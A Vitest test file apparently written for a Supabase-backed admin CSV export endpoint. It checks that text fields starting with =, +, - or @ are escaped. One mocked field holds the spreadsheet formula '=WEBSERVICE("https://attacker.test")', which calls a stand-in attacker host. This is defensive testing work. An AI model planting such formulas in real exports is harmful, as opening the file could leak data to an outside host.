import { afterEach, describe, expect, it, vi } from 'vitest'
import { createSession } from './_auth.js'
import { onRequestGet as exportRuns } from './api/export.js'

const env = {
  SESSION_SECRET: 'a-very-long-test-secret-32+chars',
  ALLOWED_EMAIL: 'admin@example.com',
  SUPABASE_URL: 'https://example.supabase.co',
  SUPABASE_SERVICE_ROLE_KEY: 'sr-key-test',
}

afterEach(() => {
  vi.restoreAllMocks()
})

describe('GET /api/export', () => {
  it('neutralizes spreadsheet formulas in exported text fields', async () => {
    const token = await createSession('admin@example.com', env.SESSION_SECRET)
    vi.spyOn(globalThis, 'fetch')
      .mockResolvedValueOnce(
        new Response(JSON.stringify([{ email: 'admin@example.com' }]), {
          status: 200,
          headers: { 'Content-Range': '0-0/1' },
        }),
      )
      .mockResolvedValueOnce(
        new Response(JSON.stringify([{ email: 'admin@example.com' }]), { status: 200 }),
      )
      .mockResolvedValueOnce(
      new Response(
        JSON.stringify([
          {
            id: 'run-1',
            created_at: '2026-07-14T00:00:00.000Z',
            display_name: '=WEBSERVICE("https://attacker.test")',
            theme: '+theme',
            mission_id: 1,
            primary_role: '-explorer',
            secondary_role: '@builder',
            profile_type: 'Aligned',
            confidence_factor: 0.9,
            scores: { final: { explorer: 88 } },
          },
        ]),
        { status: 200 },
      ),
    )

    const response = await exportRuns({
      request: new Request('https://site.test/api/export', {
        headers: { Cookie: `admin_session=${token}` },
      }),
      env,
    })

    expect(response.status).toBe(200)
    const csv = await response.text()
    expect(csv).toContain('"\'=WEBSERVICE(""https://attacker.test"")"')
    expect(csv).toContain("'+theme")
    expect(csv).toContain("'-explorer")
    expect(csv).toContain("'@builder")
  })
})
